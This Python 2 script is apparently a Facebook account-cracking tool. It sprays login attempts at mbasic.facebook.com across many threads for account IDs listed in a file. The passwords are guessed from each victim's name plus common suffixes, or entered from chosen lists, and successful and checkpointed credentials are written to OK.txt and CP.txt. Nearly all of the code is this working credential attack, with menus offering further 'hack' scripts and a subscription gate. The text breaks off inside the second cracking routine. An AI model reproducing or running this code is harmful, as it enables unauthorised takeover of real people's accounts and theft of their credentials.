#-*-coding:utf-8-*-

import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
try:
        import bs4
except ImportError:
        os.system("pip2 install bs4")
 
host="https://mbasic.facebook.com"
sua = [
'Mozilla/5.0 (Linux; Android 11; RMX3231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36'
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 9; RMX1941) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 10; SM-A105FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 10; Mi A2 Lite Build/QKQ1.191002.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 11; SM-T505 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'
'Mozilla/5.0 (Linux; Android 8.1.0; LG-H932BK Build/OPM6.171019.030.K1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3'
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',]

logo =                                          """
\x1b[1;97m$$$$$$$\   $$$$$$\  $$\   $$\  $$$$$$\  
\x1b[1;97m$$  __$$\ $$  __$$\ $$$\  $$ |$$  __$$\ 
\x1b[1;97m$$ |  $$ |$$ /  $$ |$$$$\ $$ |$$ /  $$ |
\x1b[1;97m$$$$$$$  |$$$$$$$$ |$$ $$\$$ |$$$$$$$$ |
\x1b[1;97m$$  __$$< $$  __$$ |$$ \$$$$ |$$  __$$ |
\x1b[1;97m$$ |  $$ |$$ |  $$ |$$ |\$$$ |$$ |  $$ |
\x1b[1;97m$$ |  $$ |$$ |  $$ |$$ | \$$ |$$ |  $$ |
\x1b[1;97m\__|  \__|\__|  \__|\__|  \__|\__|  \__|
\x1b[1;97m------------------------------------------------
\x1b[1;97m  ➤ Author  : Rana Nadeem Rajput  
\x1b[1;97m  ➤ Github  : Rananadeem5214
\x1b[1;97m  ➤ Fb ID   : ITXRANA.5214
\x1b[1;97m------------------------------------------------
                                                 """                                              
host="https://mbasic.facebook.com"

def sb():
    os.system('clear')
    print logo
    print('\x1b[1;97m[1]\x1b[1;97m Enter Tool Menu ')
    print('\x1b[1;97m[2]\x1b[1;97m Contact With Owner ')
    print('\x1b[1;97m[0]\x1b[1;97m Exit----------------[Remove Approval] ')
    print("\x1b[1;97m------------------------------------------------")
    sb_option() 
def sb_option():
 select = raw_input("\x1b[1;97mChoose  ")
 if select =="1":
	reg()
 if select =="2":
 	os.system('xdg-open https://m.facebook.com/ITXRANA.5214')
 else:
	print("\tSelect valid option")
	sb_option()

import uuid
def reg():
    os.system('clear')
    print logo
    try:
        to = open('/sdcard/.rana.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/Rananadeem5214/All-in1/main/server.txt').text
    if to in r:
        
        
        time.sleep(1)
        s()
    else:
        os.system('clear')
        print logo
        print '\tSubscription Failed'
        print ' \x1b[1;97mYour Token Is Not Subscribed '
        print ' \x1b[1;97mCopy the Token and send to Admin'
        print ' \x1b[1;97mSubscription Token : ' + to
        raw_input('\x1b[1;97m Press enter to send Token')
        os.system('xdg-open https://wa.me/+923082503426')
        reg()
        os.system("exit")


def reg2():
    os.system('clear')
    print logo
    print '\t Subscription not detected'
    print ' \x1b[1;97mCopy and press enter '
    id = uuid.uuid4().hex[:50]
    print ' Subscription Token : ' + id
    print ''
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+923082503426')
    sav = open('/sdcard/.rana.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;97m Press enter to check Subscription ')
    reg()
    os.system("exit")

def s():
    os.system('clear')
    print logo
    print("\x1b[1;97m  [1]\x1b[1;97m Hack From File\x1b[1;93m        {No Login}")
    print("\x1b[1;97m  [2]\x1b[1;97m Hack From Public id\x1b[1;93m   {Login}")
    print("\x1b[1;97m  [3]\x1b[1;97m Hack Multi Public id \x1b[1;93m {Login}")
    print("\x1b[1;97m  [4]\x1b[1;97m File Making\x1b[1;93m           {Login}")
    print(" \x1b[1;97m [5]\x1b[1;97m Hack From Network Code\x1b[1;93m{No Login}")
    print(" \x1b[1;97m [6]\x1b[1;97m Hack Target Account\x1b[1;93m   {No Login}")
    print(" \x1b[1;97m [0]\x1b[1;97m Back")
    print("\x1b[1;97m------------------------------------------------")
    s_option() 
def s_option():
 select = raw_input("\x1b[1;97mChoose  ")
 if select =="1":
	menu()
 elif select =="2":
	os.system('python2 public.py')
 elif select =="3":
 	os.system('python2 multi.py')
 elif select =="4":
	os.system('python2 Dump.py')
 elif select =="5":
	os.system('python2 without.py')
 elif select =="6":
	os.system('python2 Target.py')
 elif select =="0":
 	sb()

 else:
	print("\tSelect valid option")
	s_option()

def menu():
    os.system('clear')
    print logo
    print(" \x1b[1;93m [1]\x1b[1;97m Crack With Auto Pass")
    print("\x1b[1;93m  [2]\x1b[1;97m Crack With Choice Pass")
    print("\x1b[1;93m  [0]\x1b[1;97m Back")
    print("\x1b[1;97m------------------------------------------------")
    menu_option()
    
def menu_option():
	select = raw_input("\x1b[1;97mChoose ---> ")
	if select =="1":
		crack()
	elif select =="2":
		choice()
	elif select =="0":
	    s()
		
	else:
		print("\tSelect valid option")
		menu_option()

def crack():
	os.system("clear")
	print(logo)
	print("\x1b[1;91m [1]\x1b[1;97m File Cloning ")
	print("\x1b[1;91m [0]\x1b[1;97m Back")
	print("\x1b[1;97m------------------------------------------------")
	crack_select()
def crack_select():
	select = raw_input("\033[1;37mChoose  : \033[0;97m")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print 
		filelist = raw_input("\x1b[1;91m[!]\x1b[1;97m Put File Name : ")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print(" \033[1;37mRequested file not found\033[0;97m")
			raw_input(" Press enter to back ")
			crack()
	elif select =="0":
	    menu()
	else:
		print("\tSelect valid option\033[0;97m")
		choice_select()
	os.system("clear")
	print(logo)
	print("\x1b[1;97m------------------------------------------------")
	print("       [\x1b[1;97m\x1b[1;41m   Rana Tool,s Running   \x1b[0m\x1b[1;93m]")
	print("\x1b[1;97m------------------------------------------------")
	print''
	print("\033[1;91m[•]\033[1;97m Total IDs In File:\033[1;95m "+str(len(id)))
	print("\033[1;91m[•]\033[1;97m Cloning Started...")
	print("\033[1;91m[•]\033[1;97m Stop Process press CTRL+Z")
	print("\x1b[1;97m------------------------------------------------")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		sharagent = random.choice(sua)
		session = requests.Session()
		session.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":sharagent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		host="https://mbasic.facebook.com"
		try:
			ps = name + '@123'
			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps, 'login': 'submit'})
			sp = data.content
			if 'mbasic_logout_button' in sp or 'save-device' in sp:
				print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps+'\033[0;97m')
				ok = open('OK.txt', 'a')
				ok.write(uid+'|'+ps+'\n')
				ok.close()
				oks.append(uid+ps)
			else:
				if 'checkpoint' in sp:
					print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps+'\033[0;97m')
					cp = open('CP.txt', 'a')
					cp.write(uid+'|'+ps+'\n')
					cp.close()
					cps.append(uid+ps)
				else:
					ps2 = name + '1122'
					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps2, 'login': 'submit'})
					sp = data.content
					if 'mbasic_logout_button' in sp or 'save-device' in sp:
						print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps2+'\033[0;97m')
						ok = open('OK.txt', 'a')
						ok.write(uid+'|'+ps2+'\n')
						ok.close()
						oks.append(uid+ps2)
					else:
						if 'checkpoint' in sp:
							print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps2+'\033[0;97m')
							cp = open('CP.txt', 'a')
							cp.write(uid+'|'+ps2+'\n')
							cp.close()
							cps.append(uid+ps2)
						else:
							ps3 = name + '786'
							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps3, 'login': 'submit'})
							sp = data.content
							if 'mbasic_logout_button' in sp or 'save-device' in sp:
								print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps3+'\033[0;97m')
								ok = open('OK.txt', 'a')
								ok.write(uid+'|'+ps3+'\n')
								ok.close()
								oks.append(uid+ps3)
							else:
								if 'checkpoint' in sp:
									print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps3+'\033[0;97m')
									cp = open('CP.txt', 'a')
									cp.write(uid+'|'+ps3+'\n')
									cp.close()
									cps.append(uid+ps3)
								else:
									ps4 = name + '12'
									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps4, 'login': 'submit'})
									sp = data.content
									if 'mbasic_logout_button' in sp or 'save-device' in sp:
										print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps4+'\033[0;97m')
										ok = open('OK.txt', 'a')
										ok.write(uid+'|'+ps4+'\n')
										ok.close()
										oks.append(uid+ps4)
									else:
										if 'checkpoint' in sp:
											print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps4+'\033[0;97m')
											cp = open('CP.txt', 'a')
											cp.write(uid+'|'+ps4+'\n')
											cp.close()
											cps.append(uid+ps4)
										else:
											ps5 = name + '1234'
											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps5, 'login': 'submit'})
											sp = data.content
											if 'mbasic_logout_button' in sp or 'save-device' in sp:
												print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps5+'\033[0;97m')
												ok = open('OK.txt', 'a')
												ok.write(uid+'|'+ps5+'\n')
												ok.close()
												oks.append(uid+ps5)
											else:
												if 'checkpoint' in sp:
													print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps5+'\033[0;97m')
													cp = open('CP.txt', 'a')
													cp.write(uid+'|'+ps5+'\n')
													cp.close()
													cps.append(uid+ps5)
												else:
													ps6 = name.lower()
													data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps6, 'login': 'submit'})
													sp = data.content
													if 'mbasic_logout_button' in sp or 'save-device' in sp:
														print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps6+'\033[0;97m')
														ok = open('OK.txt', 'a')
														ok.write(uid+'|'+ps6+'\n')
														ok.close()
														oks.append(uid+ps6)
													else:
														if 'checkpoint' in sp:
															print(' \033[1;97m [RANA-CP] '+uid+' | '+ps6+'\033[0;97m')
															cp = open('CP.txt', 'a')
															cp.write(uid+'|'+ps6+'\n')
															cp.close()
															cps.append(uid+ps6)
														else:
															ps7 = name.lower().split(' ')[0] + name.lower().split(' ')[1]
															data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps7, 'login': 'submit'})
															sp = data.content
															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps7+'\033[0;97m')
																ok = open('OK.txt', 'a')
																ok.write(uid+'|'+ps7+'\n')
																ok.close()
																oks.append(uid+ps7)
															else:
																if 'checkpoint' in sp:
																	print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps7+'\033[0;97m')
																	cp = open('CP.txt', 'a')
																	cp.write(uid+'|'+ps7+'\n')
																	cp.close()
																	cps.append(uid+ps7)
																else:
																	ps8 = name.lower().split(' ')[1] + '1234'
																	data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps8, 'login': 'submit'})
																	sp = data.content
																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																		print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps8+'\033[0;97m')
																		ok = open('OK.txt', 'a')
																		ok.write(uid+'|'+ps8+'\n')
																		ok.close()
																		oks.append(uid+ps8)
																	else:
																		if 'checkpoint' in sp:
																			print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps8+'\033[0;97m')
																			cp = open('CP.txt', 'a')
																			cp.write(uid+'|'+ps8+'\n')
																			cp.close()
																			cps.append(uid+ps8)
																		else:
																			ps9 = name.lower().split(' ')[1] + '123'
																			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps9, 'login': 'submit'})
																			sp = data.content
																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																				print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps9+'\033[0;97m')
																				ok = open('OK.txt', 'a')
																				ok.write(uid+'|'+ps9+'\n')
																				ok.close()
																				oks.append(uid+ps9)
																			else:
																				if 'checkpoint' in sp:
																					print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps9+'\033[0;97m')
																					cp = open('CP.txt', 'a')
																					cp.write(uid+'|'+ps9+'\n')
																					cp.close()
																					cps.append(uid+ps9)
																				else:
																					ps10 = name.lower().split(' ')[1] + '12'
																					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps10, 'login': 'submit'})
																					sp = data.content
																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																						print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps10+'\033[0;97m')
																						ok = open('OK.txt', 'a')
																						ok.write(uid+'|'+ps10+'\n')
																						ok.close()
																						oks.append(uid+ps10)
																					else:
																						if 'checkpoint' in sp:
																							print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps10+'\033[0;97m')
																							cp = open('CP.txt', 'a')
																							cp.write(uid+'|'+ps10+'\n')
																							cp.close()
																							cps.append(uid+ps10)
																						else:
																							ps11 = name.lower().split(' ')[1] + '12345'
																							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps11, 'login': 'submit'})
																							sp = data.content
																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																								print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps11+'\033[0;97m')
																								ok = open('OK.txt', 'a')
																								ok.write(uid+'|'+ps11+'\n')
																								ok.close()
																								oks.append(uid+ps11)
																							else:
																								if 'checkpoint' in sp:
																									print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps11+'\033[0;97m')
																									cp = open('CP.txt', 'a')
																									cp.write(uid+'|'+ps11+'\n')
																									cp.close()
																									cps.append(uid+ps11)
																								else:
																									ps12 = name.lower().split(' ')[1] + '786'
																									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps12, 'login': 'submit'})
																									sp = data.content
																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
																										print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps12+'\033[0;97m')
																										ok = open('OK.txt', 'a')
																										ok.write(uid+'|'+ps12+'\n')
																										ok.close()
																										oks.append(uid+ps12)
																									else:
																										if 'checkpoint' in sp:
																											print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps12+'\033[0;97m')
																											cp = open('CP.txt', 'a')
																											cp.write(uid+'|'+ps12+'\n')
																											cp.close()
																											cps.append(uid+ps12)
																										else:
																											ps13 = '786786'
																											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps13, 'login': 'submit'})
																											sp = data.content
																											if 'mbasic_logout_button' in sp or 'save-device' in sp:
																												print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps13+'\033[0;97m')
																												ok = open('OK.txt', 'a')
																												ok.write(uid+'|'+ps13+'\n')
																												ok.close()
																												oks.append(uid+ps13)
																											else:
																												if 'checkpoint' in sp:
																													print(' \033[1;97m [RANA-CP] '+uid+' | '+ps13+'\033[0;97m')
																													cp = open('CP.txt', 'a')
																													cp.write(uid+'|'+ps13+'\n')
																													cp.close()
																													cps.append(uid+ps13)
																												else:
																													ps14 = name.lower().split(' ')[1] + '1122'
																													data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps14, 'login': 'submit'})
																													sp = data.content
																													if 'mbasic_logout_button' in sp or 'save-device' in sp:
																														print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps14+'\033[0;97m')
																														ok = open('OK.txt', 'a')
																														ok.write(uid+'|'+ps14+'\n')
																														ok.close()
																														oks.append(uid+ps14)
																													else:
																														if 'checkpoint' in sp:
																															print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps14+'\033[0;97m')
																															cp = open('CP.txt', 'a')
																															cp.write(uid+'|'+ps14+'\n')
																															cp.close()
																															cps.append(uid+ps14)
																														else:
																															ps15 = '123456'
																															data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps15, 'login': 'submit'})
																															sp = data.content
																															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps15+'\033[0;97m')
																																ok = open('OK.txt', 'a')
																																ok.write(uid+'|'+ps15+'\n')
																																ok.close()
																																oks.append(uid+ps15)
																															else:
																																if 'checkpoint' in sp:
																																	print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps15+'\033[0;97m')
																																	cp = open('CP.txt', 'a')
																																	cp.write(uid+'|'+ps15+'\n')
																																	cp.close()
																																	cps.append(uid+ps15)
																																else:
																																	ps16 = '1234567'
																																	data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps16, 'login': 'submit'})
																																	sp = data.content
																																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																		print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps16+'\033[0;97m')
																																		ok = open('OK.txt', 'a')
																																		ok.write(uid+'|'+ps16+'\n')
																																		ok.close()
																																		oks.append(uid+ps16)
																																	else:
																																		if 'checkpoint' in sp:
																																			print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps16+'\033[0;97m')
																																			cp = open('CP.txt', 'a')
																																			cp.write(uid+'|'+ps16+'\n')
																																			cp.close()
																																			cps.append(uid+ps16)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\x1b[1;97m------------------------------------------------")
	print ("\x1b[1;97m[!]\x1b[1;97mProcess has been complete")
	print ("\x1b[1;97m[!]\x1b[1;97mTotal OK  "+str(len(oks)))
	print ("\x1b[1;97m[!]\x1b[1;97mTotal CP  "+str(len(cps)))
	print("\x1b[1;97m------------------------------------------------")
	raw_input("\x1b[1;97mPress enter to back Tool Menu ")
	menu()
def choice():
	os.system("clear")
	print(logo)
	print("\x1b[1;97m------------------------------------------------")
	print("\x1b[1;97m [1]\x1b[1;97m Crack File \x1b[1;90m   [3  Pass]")
	print("\x1b[1;97m [2]\x1b[1;97m Crack File \x1b[1;90m   [5  Pass]")
	print("\x1b[1;97m [3]\x1b[1;97m Crack File \x1b[1;90m   [7  Pass]")
	print("\x1b[1;97m [4]\x1b[1;97m Crack File \x1b[1;90m   [10 Pass]")
	print("\x1b[1;97m [5]\x1b[1;97m Crack File \x1b[1;90m   [17 Pass] ")
	print("\x1b[1;97m [0]\x1b[1;97m Back")
	print("\x1b[1;97m------------------------------------------------")
	choice_select()
def choice_select():
	select = raw_input("\x1b[1;97mChoose ---> ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		ps = raw_input("\033[1;91m[!]\x1b[1;97m Password1: ")
		ps2 = raw_input("\033[1;91m[!]\x1b[1;97m Password2: ")
		ps3 = raw_input("\033[1;91m[!]\x1b[1;97m Password3: ")
		filelist = raw_input("\x1b[1;91m[!]\x1b[1;97mFile Name : \x1b[1;97m")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;37mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			choice()
	elif select =="2":
		os.system("clear")
		print(logo)
		ps = raw_input("\033[1;97m[!]\x1b[1;97m Password1: ")
		ps2 = raw_input("\033[1;97m[!]\x1b[1;97m Password2: ")
		ps3 = raw_input("\033[1;97m[!]\x1b[1;97m Password3: ")
		ps4 = raw_input("\033[1;97m[!]\x1b[1;97m Password4: ")
		ps5 = raw_input("\033[1;97m[!]\x1b[1;97m Password5: ")
		filelist = raw_input("\x1b[1;97m[!]\x1b[1;97mFile Name : \x1b[1;97m")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;37mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			choice()
	elif select =="3":
		os.system("clear")
		print(logo)
		ps = raw_input("\033[1;97m[!]\x1b[1;97m Password1: ")
		ps2 = raw_input("\033[1;97m[!]\x1b[1;97m Password2: ")
		ps3 = raw_input("\033[1;97m[!]\x1b[1;97m Password3: ")
		ps4 = raw_input("\033[1;97m[!]\x1b[1;97m Password4: ")
		ps5 = raw_input("\033[1;97m[!]\x1b[1;97m Password5: ")
		ps6 = raw_input("\033[1;97m[!]\x1b[1;97m Password6: ")
		ps7 = raw_input("\033[1;97m[!]\x1b[1;97m Password7: ")
		filelist = raw_input("\x1b[1;97m[!]\x1b[1;97mFile Name : \x1b[1;97m")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;37mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			choice()
	elif select =="4":
		os.system("clear")
		print(logo)
		ps = raw_input("\033[1;97m[!]\x1b[1;97m Password1: ")
		ps2 = raw_input("\033[1;97m[!]\x1b[1;97m Password2: ")
		ps3 = raw_input("\033[1;97m[!]\x1b[1;97m Password3: ")
		ps4 = raw_input("\033[1;97m[!]\x1b[1;97m Password4: ")
		ps5 = raw_input("\033[1;97m[!]\x1b[1;97m Password5: ")
		ps6 = raw_input("\033[1;97m[!]\x1b[1;97m Password6: ")
		ps7 = raw_input("\033[1;97m[!]\x1b[1;97m Password7: ")
		ps8 = raw_input("\033[1;97m[!]\x1b[1;97m Password8: ")
		ps9 = raw_input("\033[1;97m[!]\x1b[1;97m Password9: ")
		ps10 = raw_input("\033[1;97m[!]\x1b[1;97m Password10: ")
		filelist = raw_input("\x1b[1;97m[!]\x1b[1;97mFile Name : \x1b[1;97m")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;37mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			choice()
	elif select =="5":
		os.system("clear")
		print(logo)
		ps = raw_input("\033[1;97m[!]\x1b[1;97m Password1: ")
		ps2 = raw_input("\033[1;97m[!]\x1b[1;97m Password2: ")
		ps3 = raw_input("\033[1;97m[!]\x1b[1;97m Password3: ")
		ps4 = raw_input("\033[1;97m[!]\x1b[1;97m Password4: ")
		ps5 = raw_input("\033[1;97m[!]\x1b[1;97m Password5: ")
		ps6 = raw_input("\033[1;97m[!]\x1b[1;97m Password6: ")
		ps7 = raw_input("\033[1;97m[!]\x1b[1;97m Password7: ")
		ps8 = raw_input("\033[1;97m[!]\x1b[1;97m Password8: ")
		ps9 = raw_input("\033[1;97m[!]\x1b[1;97m Password9: ")
		ps10 = raw_input("\033[1;97m[!]\x1b[1;97m Password10: ")
		ps11 = raw_input("\033[1;97m[!]\x1b[1;97m Password11: ")
		ps12 = raw_input("\033[1;97m[!]\x1b[1;97m Password12: ")
		ps13 = raw_input("\033[1;97m[!]\x1b[1;97m Password13: ")
		ps14 = raw_input("\033[1;97m[!]\x1b[1;97m Password14: ")
		ps15 = raw_input("\033[1;97m[!]\x1b[1;97m Password15: ")
		ps16 = raw_input("\033[1;97m[!]\x1b[1;97m Password16: ")
		ps17 = raw_input("\033[1;97m[!]\x1b[1;97m Password17: ")
		filelist = raw_input("\x1b[1;97m[!]\x1b[1;97mFile Name : \x1b[1;97m")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;37mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			choice()
	elif select =="0":
	    menu()
	else:
		print("\tSelect valid option\033[0;97m")
		choice_select()
	os.system("clear")
	print(logo)
	print("\x1b[1;97m------------------------------------------------")
	print(" \x1b[1;91m     [\x1b[1;97m\x1b[1;41m   Rana Tool,s Running   \x1b[0m\x1b[1;93m]")
	print("\x1b[1;97m------------------------------------------------")
	print("\033[1;91m[•]\033[1;97m Total IDs In File:\033[1;95m "+str(len(id)))
	print("\033[1;91m[•]\033[1;97m Cloning Started...")
	print("\033[1;91m[•]\033[1;97m Stop Process press CTRL+Z")
	print("\x1b[1;97m------------------------------------------------")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		sharagent = random.choice(sua)
		session = requests.Session()
		session.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":sharagent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		host="https://mbasic.facebook.com"
		try:
			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps, 'login': 'submit'})
			sp = data.content
			if 'mbasic_logout_button' in sp or 'save-device' in sp:
				print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps+'\033[0;97m')
				ok = open('OK.txt', 'a')
				ok.write(uid+'|'+ps+'\n')
				ok.close()
				oks.append(uid+ps)
			else:
				if 'checkpoint' in sp:
					print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps+'\033[0;97m')
					cp = open('CP.txt', 'a')
					cp.write(uid+'|'+ps+'\n')
					cp.close()
					cps.append(uid+ps)
